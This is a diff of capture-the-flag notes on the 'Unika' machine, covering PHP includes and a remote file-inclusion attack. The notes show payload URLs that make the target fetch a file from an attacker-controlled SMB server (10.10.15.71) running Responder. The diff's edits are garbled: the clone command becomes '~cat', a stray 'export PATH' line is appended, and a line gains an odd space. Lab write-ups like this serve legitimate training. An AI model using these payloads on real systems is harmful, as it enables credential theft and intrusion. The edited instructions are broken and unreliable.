@@ -10,7 +10,7 @@ $fruit = 'apple';
 #############################################
 File 2 --> test.php
 <?php
-echo "A $color $fruit"; // output = "A"
+ echo "A $color $fruit"; // output = "A"
 include 'vars.php';
 echo "A $color $fruit"; // output = "A green apple"
 ?>
@@ -34,7 +34,7 @@ What can be done if windows server:
 ### SMB
 
 ```sh
-git clone https://github.com/lgandx/Responder
+~cat
 ```
 Verify that the Responder.conf is set to listen for SMB requests.
 
@@ -53,4 +53,7 @@ With the SMB server running, we can now try to include the file from the server
 http://unika.htb/?page=//<yourIP>/somefile
 
 http://unika.htb/?page=//10.10.15.71/somefile
+
+
+export PATH=~/bin:$PATH
 ```
